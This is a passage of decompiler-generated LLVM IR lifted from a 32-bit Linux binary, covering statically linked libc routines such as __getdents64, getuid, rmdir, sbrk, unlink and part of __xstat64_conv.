  uselistorder i32 %v0_80612b4, { 1, 0, 2 }
  uselistorder i32 %v0_806129c, { 1, 0 }
  uselistorder i32 (i8*, i32)* @memmove, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80612cd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061288, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_80612d7 = load i32, i32* @edi, align 4
  %v0_80612d9 = load i32, i32* @ebx, align 4
  %v15_80612da = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_80612e3 = add i32 %arg3, 30
  %v1_80612e9 = and i32 %v1_80612e3, -16
  %v2_80612ec = sub i32 %v15_80612da, %v1_80612e9
  %v1_80612ee = add i32 %v2_80612ec, 15
  %v1_80612f2 = and i32 %v1_80612ee, -16
  %v1_80612f8 = inttoptr i32 %v1_80612f2 to %linux_dirent64*
  store i32 %v1_80612f2, i32* @ecx, align 4
  %v2_80612fa = add i32 %v2_80612ec, -4
  %v3_80612fa = inttoptr i32 %v2_80612fa to i32*
  store i32 %v0_80612d9, i32* %v3_80612fa, align 4
  %v0_80612fb = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8061302 = call i32 @getdents64(i32 %v0_80612fb, %linux_dirent64* %v1_80612f8, i32 %arg3)
  store i32 %v5_8061302, i32* %eax.global-to-local, align 4
  %v0_8061304 = load i32, i32* @esp, align 4
  %v3_8061304 = add i32 %v0_8061304, 4
  %tmp = icmp ult i32 %v5_8061302, -4095
  br i1 %tmp, label %dec_label_pc_806131e, label %dec_label_pc_806130f

dec_label_pc_806130f:                             ; preds = %entry
  %v1_806130f = call i32 @__errno_location(i32 %v5_8061302)
  store i32 %v1_806130f, i32* %eax.global-to-local, align 4
  %v4_8061314 = sub i32 0, %v5_8061302
  %v2_806131a = inttoptr i32 %v1_806130f to i32*
  store i32 %v4_8061314, i32* %v2_806131a, align 4
  br label %dec_label_pc_806137a

dec_label_pc_806131e:                             ; preds = %entry
  br i1 false, label %dec_label_pc_806137a, label %dec_label_pc_8061324

dec_label_pc_8061324:                             ; preds = %dec_label_pc_806131e
  store i32 %tmp13, i32* @esi, align 4
  store i32 %v1_80612f2, i32* @ebx, align 4
  %v5_80613d0 = add i32 %v5_8061302, %v1_80612f2
  store i32 %v5_80613d0, i32* %eax.global-to-local, align 4
  %v7_80613d330 = icmp ult i32 %v1_80612f2, %v5_80613d0
  br i1 %v7_80613d330, label %dec_label_pc_806133d.lr.ph, label %dec_label_pc_80613db

dec_label_pc_806133d.lr.ph:                       ; preds = %dec_label_pc_8061324
  %v5_806134a = add i32 %tmp13, %arg3
  br label %dec_label_pc_806133d

dec_label_pc_806133d:                             ; preds = %dec_label_pc_806133d.lr.ph, %dec_label_pc_806137f
  %stack_var_-32.040 = phi i32 [ -1, %dec_label_pc_806133d.lr.ph ], [ %v3_8061382, %dec_label_pc_806137f ]
  %stack_var_-36.039 = phi i32 [ -1, %dec_label_pc_806133d.lr.ph ], [ %v3_806137f, %dec_label_pc_806137f ]
  %v0_806138b38 = phi i32 [ %v1_80612f2, %dec_label_pc_806133d.lr.ph ], [ %v2_80613c8, %dec_label_pc_806137f ]
  %v1_806139037 = phi i32 [ %tmp13, %dec_label_pc_806133d.lr.ph ], [ %v2_806134d, %dec_label_pc_806137f ]
  %v0_806135736 = phi i32 [ %v3_8061304, %dec_label_pc_806133d.lr.ph ], [ %v1_80613ca, %dec_label_pc_806137f ]
  %v1_806133d = add i32 %v0_806138b38, 16
  %v2_806133d = inttoptr i32 %v1_806133d to i16*
  %v3_806133d = load i16, i16* %v2_806133d, align 2
  %v4_806133d = zext i16 %v3_806133d to i32
  %v1_8061341 = add nuw nsw i32 %v4_806133d, 3
  %v1_8061347 = and i32 %v1_8061341, 131068
  store i32 %v1_8061347, i32* %ecx.global-to-local, align 4
  store i32 %v5_806134a, i32* %eax.global-to-local, align 4
  %v2_806134d = add i32 %v1_8061347, %v1_806139037
  %tmp45 = icmp ugt i32 %v2_806134d, %v5_806134a
  br i1 %tmp45, label %dec_label_pc_8061357, label %dec_label_pc_806137f

dec_label_pc_8061357:                             ; preds = %dec_label_pc_806133d
  %v1_8061357 = add i32 %v0_806135736, -4
  %v2_8061357 = inttoptr i32 %v1_8061357 to i32*
  store i32 0, i32* %v2_8061357, align 4
  %v5_8061359 = add i32 %v0_806135736, -8
  %v6_8061359 = inttoptr i32 %v5_8061359 to i32*
  store i32 %stack_var_-32.040, i32* %v6_8061359, align 4
  %v5_806135c = add i32 %v0_806135736, -12
  %v6_806135c = inttoptr i32 %v5_806135c to i32*
  store i32 %stack_var_-36.039, i32* %v6_806135c, align 4
  %v5_806135f = add i32 %v0_806135736, -16
  %v6_806135f = inttoptr i32 %v5_806135f to i32*
  store i32 %arg1, i32* %v6_806135f, align 4
  %v4_8061362 = call i32 @__libc_lseek64(i32 %v2_806134d, i32 %stack_var_-36.039, i32 %stack_var_-32.040, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8061362, i32* %eax.global-to-local, align 4
  %v0_806136a = load i32, i32* @esi, align 4
  %v15_806136a = icmp eq i32 %v0_806136a, %tmp13
  %v1_806136d = icmp eq i1 %v15_806136a, false
  br i1 %v1_806136d, label %dec_label_pc_80613db, label %dec_label_pc_806136f

dec_label_pc_806136f:                             ; preds = %dec_label_pc_8061357
  %v1_806136f = call i32 @__errno_location(i32 %v2_806134d)
  store i32 %v1_806136f, i32* %eax.global-to-local, align 4
  %v1_8061374 = inttoptr i32 %v1_806136f to i32*
  store i32 22, i32* %v1_8061374, align 4
  br label %dec_label_pc_806137a

dec_label_pc_806137a:                             ; preds = %dec_label_pc_806131e, %dec_label_pc_806130f, %dec_label_pc_806136f
  br label %dec_label_pc_80613e0

dec_label_pc_806137f:                             ; preds = %dec_label_pc_806133d
  %v1_806137f = add i32 %v0_806138b38, 8
  %v2_806137f = inttoptr i32 %v1_806137f to i32*
  %v3_806137f = load i32, i32* %v2_806137f, align 4
  store i32 %v3_806137f, i32* %eax.global-to-local, align 4
  %v1_8061382 = add i32 %v0_806138b38, 12
  %v2_8061382 = inttoptr i32 %v1_8061382 to i32*
  %v3_8061382 = load i32, i32* %v2_8061382, align 4
  %v1_806138b = inttoptr i32 %v0_806138b38 to i32*
  %v2_806138b = load i32, i32* %v1_806138b, align 4
  store i32 %v2_806138b, i32* %eax.global-to-local, align 4
  %v1_806138d = add i32 %v0_806138b38, 4
  %v2_806138d = inttoptr i32 %v1_806138d to i32*
  %v3_806138d = load i32, i32* %v2_806138d, align 4
  %v2_8061390 = add i32 %v1_806139037, 4
  %v3_8061390 = inttoptr i32 %v2_8061390 to i32*
  store i32 %v3_806138d, i32* %v3_8061390, align 4
  %v0_8061393 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061393 = load i32, i32* @esi, align 4
  %v2_8061393 = inttoptr i32 %v1_8061393 to i32*
  store i32 %v0_8061393, i32* %v2_8061393, align 4
  %v0_8061395 = load i32, i32* @ebx, align 4
  %v1_8061395 = add i32 %v0_8061395, 8
  %v2_8061395 = inttoptr i32 %v1_8061395 to i32*
  %v3_8061395 = load i32, i32* %v2_8061395, align 4
  store i32 %v3_8061395, i32* %eax.global-to-local, align 4
  %v1_8061398 = add i32 %v0_8061395, 12
  %v2_8061398 = inttoptr i32 %v1_8061398 to i32*
  %v3_8061398 = load i32, i32* %v2_8061398, align 4
  %v1_806139b = load i32, i32* @esi, align 4
  %v2_806139b = add i32 %v1_806139b, 12
  %v3_806139b = inttoptr i32 %v2_806139b to i32*
  store i32 %v3_8061398, i32* %v3_806139b, align 4
  %v0_806139e = load i32, i32* %eax.global-to-local, align 4
  %v1_806139e = load i32, i32* @esi, align 4
  %v2_806139e = add i32 %v1_806139e, 8
  %v3_806139e = inttoptr i32 %v2_806139e to i32*
  store i32 %v0_806139e, i32* %v3_806139e, align 4
  %v0_80613a1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80613a1 = trunc i32 %v0_80613a1 to i16
  %v2_80613a1 = load i32, i32* @esi, align 4
  %v3_80613a1 = add i32 %v2_80613a1, 16
  %v4_80613a1 = inttoptr i32 %v3_80613a1 to i16*
  store i16 %v1_80613a1, i16* %v4_80613a1, align 2
  %v0_80613a5 = load i32, i32* @ebx, align 4
  %v1_80613a5 = add i32 %v0_80613a5, 18
  %v2_80613a5 = inttoptr i32 %v1_80613a5 to i8*
  %v3_80613a5 = load i8, i8* %v2_80613a5, align 1
  %v4_80613a5 = zext i8 %v3_80613a5 to i32
  %v5_80613a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80613a5 = and i32 %v5_80613a5, -256
  %v7_80613a5 = or i32 %v6_80613a5, %v4_80613a5
  store i32 %v7_80613a5, i32* %eax.global-to-local, align 4
  %v2_80613a8 = load i32, i32* @esi, align 4
  %v3_80613a8 = add i32 %v2_80613a8, 18
  %v4_80613a8 = inttoptr i32 %v3_80613a8 to i8*
  store i8 %v3_80613a5, i8* %v4_80613a8, align 1
  %v0_80613ab = load i32, i32* %eax.global-to-local, align 4
  %v1_80613ab = load i32, i32* @esp, align 4
  %v2_80613ab = add i32 %v1_80613ab, -4
  %v3_80613ab = inttoptr i32 %v2_80613ab to i32*
  store i32 %v0_80613ab, i32* %v3_80613ab, align 4
  %v0_80613ac = load i32, i32* @ebx, align 4
  %v1_80613ac = add i32 %v0_80613ac, 16
  %v2_80613ac = inttoptr i32 %v1_80613ac to i16*
  %v3_80613ac = load i16, i16* %v2_80613ac, align 2
  %v4_80613ac = zext i16 %v3_80613ac to i32
  %v1_80613b0 = add nsw i32 %v4_80613ac, -19
  %v2_80613b3 = add i32 %v1_80613ab, -8
  %v3_80613b3 = inttoptr i32 %v2_80613b3 to i32*
  store i32 %v1_80613b0, i32* %v3_80613b3, align 4
  %v0_80613b4 = load i32, i32* @ebx, align 4
  %v1_80613b4 = add i32 %v0_80613b4, 19
  %v2_80613b7 = add i32 %v1_80613ab, -12
  %v3_80613b7 = inttoptr i32 %v2_80613b7 to i32*
  store i32 %v1_80613b4, i32* %v3_80613b7, align 4
  %v0_80613b8 = load i32, i32* @esi, align 4
  %v1_80613b8 = add i32 %v0_80613b8, 19
  store i32 %v1_80613b8, i32* %eax.global-to-local, align 4
  %v2_80613bb = add i32 %v1_80613ab, -16
  %v3_80613bb = inttoptr i32 %v2_80613bb to i32*
  store i32 %v1_80613b8, i32* %v3_80613bb, align 4
  %v3_80613bc = inttoptr i32 %v2_806134d to i16*
  %v4_80613bc = call i32 @memcpy(i16* %v3_80613bc, i32 %v3_806137f, i32 %v3_8061382)
  store i32 %v4_80613bc, i32* %eax.global-to-local, align 4
  %v0_80613c1 = load i32, i32* @ebx, align 4
  %v1_80613c1 = add i32 %v0_80613c1, 16
  %v2_80613c1 = inttoptr i32 %v1_80613c1 to i16*
  %v3_80613c1 = load i16, i16* %v2_80613c1, align 2
  %v4_80613c1 = zext i16 %v3_80613c1 to i32
  store i32 %v2_806134d, i32* @esi, align 4
  %v2_80613c8 = add i32 %v4_80613c1, %v0_80613c1
  store i32 %v2_80613c8, i32* @ebx, align 4
  %v0_80613ca = load i32, i32* @esp, align 4
  %v1_80613ca = add i32 %v0_80613ca, 16
  store i32 %v5_80613d0, i32* %eax.global-to-local, align 4
  %v7_80613d3 = icmp ult i32 %v2_80613c8, %v5_80613d0
  br i1 %v7_80613d3, label %dec_label_pc_806133d, label %dec_label_pc_80613db

dec_label_pc_80613db:                             ; preds = %dec_label_pc_8061324, %dec_label_pc_806137f, %dec_label_pc_8061357
  %v0_80613db = phi i32 [ %v0_806136a, %dec_label_pc_8061357 ], [ %tmp13, %dec_label_pc_8061324 ], [ %v2_806134d, %dec_label_pc_806137f ]
  store i32 %v0_80613db, i32* %eax.global-to-local, align 4
  %v5_80613dd = sub i32 %v0_80613db, %tmp13
  br label %dec_label_pc_80613e0

dec_label_pc_80613e0:                             ; preds = %dec_label_pc_806137a, %dec_label_pc_80613db
  %storemerge = phi i32 [ -1, %dec_label_pc_806137a ], [ %v5_80613dd, %dec_label_pc_80613db ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80612d9, i32* @ebx, align 4
  store i32 %v0_80612d7, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80613db, { 1, 0 }
  uselistorder i32 %v2_80613c8, { 0, 2, 1 }
  uselistorder i32 %v3_8061382, { 1, 0 }
  uselistorder i32 %v3_806137f, { 1, 2, 0 }
  uselistorder i32 %v0_806136a, { 1, 0 }
  uselistorder i32 %v2_806134d, { 1, 5, 6, 2, 3, 0, 4 }
  uselistorder i32 %v0_806135736, { 3, 2, 1, 0 }
  uselistorder i32 %v0_806138b38, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_80613d0, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8061302, { 1, 3, 2, 0, 4 }
  uselistorder i32 %tmp13, { 5, 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 17, 19, 18 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80613e0, { 1, 0 }
  uselistorder label %dec_label_pc_80613db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806137a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806133d, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80613e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80613e8, i32* %stack_var_-4, align 4
  %v1_80613f1 = call i32 @int80_syscall(i32 202)
  store i32 %v1_80613f1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80613f1, -4095
  br i1 %tmp, label %dec_label_pc_8061408, label %dec_label_pc_80613fc

dec_label_pc_80613fc:                             ; preds = %entry
  %v0_80613fc = load i32, i32* %stack_var_-4, align 4
  %v1_80613fc = call i32 @__errno_location(i32 %v0_80613fc)
  %v0_8061401 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061401 = sub i32 0, %v0_8061401
  %v2_8061403 = inttoptr i32 %v1_80613fc to i32*
  store i32 %v1_8061401, i32* %v2_8061403, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061408

dec_label_pc_8061408:                             ; preds = %entry, %dec_label_pc_80613fc
  %v0_8061408 = phi i32 [ %v1_80613f1, %entry ], [ -1, %dec_label_pc_80613fc ]
  %v2_806140c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806140c, i32* @ebx, align 4
  ret i32 %v0_8061408

; uselistorder directives
  uselistorder i32 %v1_80613f1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061408, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061410 = load i32, i32* @ebx, align 4
  store i32 %v0_8061410, i32* %stack_var_-4, align 4
  %v1_8061419 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8061419, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061419, -4095
  br i1 %tmp, label %dec_label_pc_8061430, label %dec_label_pc_8061424

dec_label_pc_8061424:                             ; preds = %entry
  %v0_8061424 = load i32, i32* %stack_var_-4, align 4
  %v1_8061424 = call i32 @__errno_location(i32 %v0_8061424)
  %v0_8061429 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061429 = sub i32 0, %v0_8061429
  %v2_806142b = inttoptr i32 %v1_8061424 to i32*
  store i32 %v1_8061429, i32* %v2_806142b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061430

dec_label_pc_8061430:                             ; preds = %entry, %dec_label_pc_8061424
  %v0_8061430 = phi i32 [ %v1_8061419, %entry ], [ -1, %dec_label_pc_8061424 ]
  %v2_8061434 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061434, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061430

; uselistorder directives
  uselistorder i32 %v1_8061419, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061430, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061438 = load i32, i32* @ebx, align 4
  store i32 %v0_8061438, i32* %stack_var_-4, align 4
  %v1_8061441 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8061441, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061441, -4095
  br i1 %tmp, label %dec_label_pc_8061458, label %dec_label_pc_806144c

dec_label_pc_806144c:                             ; preds = %entry
  %v0_806144c = load i32, i32* %stack_var_-4, align 4
  %v1_806144c = call i32 @__errno_location(i32 %v0_806144c)
  %v0_8061451 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061451 = sub i32 0, %v0_8061451
  %v2_8061453 = inttoptr i32 %v1_806144c to i32*
  store i32 %v1_8061451, i32* %v2_8061453, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061458

dec_label_pc_8061458:                             ; preds = %entry, %dec_label_pc_806144c
  %v0_8061458 = phi i32 [ %v1_8061441, %entry ], [ -1, %dec_label_pc_806144c ]
  %v2_806145c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806145c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061458

; uselistorder directives
  uselistorder i32 %v1_8061441, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061458, { 1, 0 }
}

define i32 @rmdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061460 = load i32, i32* @edi, align 4
  store i32 %v0_8061460, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8061468 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8061470 = call i32 @rmdir(i32 %v0_8061468)
  store i32 %v0_8061468, i32* @ebx, align 4
  store i32 %v1_8061470, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061470, -4095
  br i1 %tmp, label %dec_label_pc_8061488, label %dec_label_pc_806147c

dec_label_pc_806147c:                             ; preds = %entry
  %v1_806147c = call i32 @__errno_location(i32 %v0_8061468)
  %v0_8061481 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061481 = sub i32 0, %v0_8061481
  %v2_8061483 = inttoptr i32 %v1_806147c to i32*
  store i32 %v1_8061481, i32* %v2_8061483, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061488

dec_label_pc_8061488:                             ; preds = %entry, %dec_label_pc_806147c
  %v0_8061488 = phi i32 [ %v1_8061470, %entry ], [ -1, %dec_label_pc_806147c ]
  %v2_806148c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806148c, i32* @edi, align 4
  ret i32 %v0_8061488

; uselistorder directives
  uselistorder i32 %v1_8061470, { 1, 0, 2 }
  uselistorder i32 %v0_8061468, { 1, 0, 2 }
  uselistorder i32 (i32)* @rmdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061488, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8061491 = load i32, i32* @ebx, align 4
  %v0_8061495 = load i32, i32* @global_var_807ca44.841, align 4
  %v1_8061495 = icmp eq i32 %v0_8061495, 0
  %v1_80614a0 = icmp eq i1 %v1_8061495, false
  br i1 %v1_80614a0, label %dec_label_pc_80614b3, label %dec_label_pc_80614a2

dec_label_pc_80614a2:                             ; preds = %entry
  %v1_80614a7 = call i32 @__GI_brk(i32 0)
  %v2_80614af = icmp slt i32 %v1_80614a7, 0
  br i1 %v2_80614af, label %dec_label_pc_80614d5, label %dec_label_pc_80614a2.dec_label_pc_80614b3_crit_edge

dec_label_pc_80614a2.dec_label_pc_80614b3_crit_edge: ; preds = %dec_label_pc_80614a2
  %v0_80614b5.pre = load i32, i32* @global_var_807ca44.841, align 4
  br label %dec_label_pc_80614b3

dec_label_pc_80614b3:                             ; preds = %dec_label_pc_80614a2.dec_label_pc_80614b3_crit_edge, %entry
  %v0_80614c3 = phi i32 [ %v0_80614b5.pre, %dec_label_pc_80614a2.dec_label_pc_80614b3_crit_edge ], [ %v0_8061495, %entry ]
  %v1_80614b3 = icmp eq i32 %arg1, 0
  %v1_80614ba = icmp eq i1 %v1_80614b3, false
  br i1 %v1_80614ba, label %dec_label_pc_80614c0, label %dec_label_pc_80614bc

dec_label_pc_80614bc:                             ; preds = %dec_label_pc_80614b3
  br label %dec_label_pc_80614d8

dec_label_pc_80614c0:                             ; preds = %dec_label_pc_80614b3
  store i32 %v0_80614c3, i32* @ebx, align 4
  %v2_80614c5 = add i32 %v0_80614c3, %arg1
  %v1_80614c9 = call i32 @__GI_brk(i32 %v2_80614c5)
  %v2_80614d1 = icmp slt i32 %v1_80614c9, 0
  %v1_80614d3 = icmp eq i1 %v2_80614d1, false
  br i1 %v1_80614d3, label %dec_label_pc_80614c0.dec_label_pc_80614d8_crit_edge, label %dec_label_pc_80614d5

dec_label_pc_80614c0.dec_label_pc_80614d8_crit_edge: ; preds = %dec_label_pc_80614c0
  %v0_80614d8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80614d8

dec_label_pc_80614d5:                             ; preds = %dec_label_pc_80614c0, %dec_label_pc_80614a2
  br label %dec_label_pc_80614d8

dec_label_pc_80614d8:                             ; preds = %dec_label_pc_80614c0.dec_label_pc_80614d8_crit_edge, %dec_label_pc_80614bc, %dec_label_pc_80614d5
  %v0_80614d8 = phi i32 [ %v0_80614d8.pre, %dec_label_pc_80614c0.dec_label_pc_80614d8_crit_edge ], [ %v0_80614c3, %dec_label_pc_80614bc ], [ -1, %dec_label_pc_80614d5 ]
  store i32 %v0_8061491, i32* @ebx, align 4
  ret i32 %v0_80614d8

; uselistorder directives
  uselistorder i32 %v0_80614c3, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80614d8, { 2, 0, 1 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80614e0 = load i32, i32* @edi, align 4
  store i32 %v0_80614e0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80614e8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80614f0 = call i32 @unlink(i32 %v0_80614e8)
  store i32 %v1_80614f0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80614f0, -4095
  br i1 %tmp, label %dec_label_pc_8061508, label %dec_label_pc_80614fc

dec_label_pc_80614fc:                             ; preds = %entry
  %v1_80614fc = call i32 @__errno_location(i32 %v0_80614e8)
  %v0_8061501 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061501 = sub i32 0, %v0_8061501
  %v2_8061503 = inttoptr i32 %v1_80614fc to i32*
  store i32 %v1_8061501, i32* %v2_8061503, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061508

dec_label_pc_8061508:                             ; preds = %entry, %dec_label_pc_80614fc
  %v0_8061508 = phi i32 [ %v1_80614f0, %entry ], [ -1, %dec_label_pc_80614fc ]
  %v2_806150c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806150c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8061508

; uselistorder directives
  uselistorder i32 %v1_80614f0, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061508, { 1, 0 }
}

define i32 @__xstat64_conv(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8061511 = load i32, i32* @ebx, align 4
  store i32 %v0_8061511, i32* %stack_var_-8, align 4
  %v4_8061515 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8061515, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8061522 = inttoptr i32 %arg2 to i8*
  %v4_8061522 = call i32 @__GI_memset(i8* %v3_8061522, i32 0, i32 96)
  store i32 %v4_8061522, i32* %eax.global-to-local, align 4
  %v2_8061527 = load i16, i16* %arg1, align 2
  %v3_8061527 = zext i16 %v2_8061527 to i32
  store i32 %v3_8061527, i32* %eax.global-to-local, align 4
  %v0_806152a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806152a = add i32 %v0_806152a, 4
  %v2_806152a = inttoptr i32 %v1_806152a to i32*
  store i32 0, i32* %v2_806152a, align 4
  %v0_8061531 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061531 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061531 = inttoptr i32 %v1_8061531 to i32*
  store i32 %v0_8061531, i32* %v2_8061531, align 4
  %v0_8061533 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061533 = add i32 %v0_8061533, 88
  %v2_8061533 = inttoptr i32 %v1_8061533 to i32*
  %v3_8061533 = load i32, i32* %v2_8061533, align 4
  store i32 %v3_8061533, i32* %eax.global-to-local, align 4
  %v1_8061536 = add i32 %v0_8061533, 92
  %v2_8061536 = inttoptr i32 %v1_8061536 to i32*
  %v3_8061536 = load i32, i32* %v2_8061536, align 4
  %v1_8061539 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061539 = add i32 %v1_8061539, 92
  %v3_8061539 = inttoptr i32 %v2_8061539 to i32*
  store i32 %v3_8061536, i32* %v3_8061539, align 4
  %v0_806153c = load i32, i32* %eax.global-to-local, align 4
  %v1_806153c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806153c = add i32 %v1_806153c, 88
  %v3_806153c = inttoptr i32 %v2_806153c to i32*
  store i32 %v0_806153c, i32* %v3_806153c, align 4
  %v0_806153f = load i32, i32* %esi.global-to-local, align 4
  %v1_806153f = add i32 %v0_806153f, 12
  %v2_806153f = inttoptr i32 %v1_806153f to i32*
  %v3_806153f = load i32, i32* %v2_806153f, align 4
  store i32 %v3_806153f, i32* %eax.global-to-local, align 4
  %v1_8061542 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061542 = add i32 %v1_8061542, 12
  %v3_8061542 = inttoptr i32 %v2_8061542 to i32*
  store i32 %v3_806153f, i32* %v3_8061542, align 4
  %v0_8061545 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061545 = add i32 %v0_8061545, 16
  %v2_8061545 = inttoptr i32 %v1_8061545 to i32*
  %v3_8061545 = load i32, i32* %v2_8061545, align 4
  store i32 %v3_8061545, i32* %eax.global-to-local, align 4
  %v1_8061548 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061548 = add i32 %v1_8061548, 16
  %v3_8061548 = inttoptr i32 %v2_8061548 to i32*
  store i32 %v3_8061545, i32* %v3_8061548, align 4
  %v0_806154b = load i32, i32* %esi.global-to-local, align 4
  %v1_806154b = add i32 %v0_806154b, 20
  %v2_806154b = inttoptr i32 %v1_806154b to i32*
  %v3_806154b = load i32, i32* %v2_806154b, align 4
  store i32 %v3_806154b, i32* %eax.global-to-local, align 4
  %v1_806154e = load i32, i32* %ebx.global-to-local, align 4
  %v2_806154e = add i32 %v1_806154e, 20
  %v3_806154e = inttoptr i32 %v2_806154e to i32*
  store i32 %v3_806154b, i32* %v3_806154e, align 4
  %v0_8061551 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061551 = add i32 %v0_8061551, 24
  %v2_8061551 = inttoptr i32 %v1_8061551 to i32*
  %v3_8061551 = load i32, i32* %v2_8061551, align 4
  store i32 %v3_8061551, i32* %eax.global-to-local, align 4
  %v1_8061554 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061554 = add i32 %v1_8061554, 24
  %v3_8061554 = inttoptr i32 %v2_8061554 to i32*
  store i32 %v3_8061551, i32* %v3_8061554, align 4
  %v0_8061557 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061557 = add i32 %v0_8061557, 28
  %v2_8061557 = inttoptr i32 %v1_8061557 to i32*
  %v3_8061557 = load i32, i32* %v2_8061557, align 4
  store i32 %v3_8061557, i32* %eax.global-to-local, align 4
  %v1_806155a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806155a = add i32 %v1_806155a, 28
  %v3_806155a = inttoptr i32 %v2_806155a to i32*
  store i32 %v3_8061557, i32* %v3_806155a, align 4
  %v0_806155d = load i32, i32* %esi.global-to-local, align 4
  %v1_806155d = add i32 %v0_806155d, 32
  %v2_806155d = inttoptr i32 %v1_806155d to i16*
  %v3_806155d = load i16, i16* %v2_806155d, align 2
